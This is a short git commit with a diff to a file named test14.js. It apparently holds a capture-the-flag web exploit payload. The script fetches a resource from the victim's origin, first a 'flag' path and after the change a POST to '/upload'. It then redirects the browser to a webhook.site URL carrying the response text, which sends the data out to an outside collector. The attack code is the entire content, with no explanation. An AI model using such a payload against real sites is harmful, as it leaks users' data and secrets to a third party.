e42b8892d55f488b350a1e6225cf4027f1e8ae85
Emyr298 <emi.ru298@gmail.com>
2023-12-03 13:09:36 +0700

    s

--- test14.js
+++ test14.js
@@ -1,4 +1,4 @@
-fetch('flag').then((res) => {
+fetch('/upload', { method: 'POST' }).then((res) => {
     res.text().then((test) => {
         window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/${encodeURIComponent(test)}`;
     }).catch((owo) => {
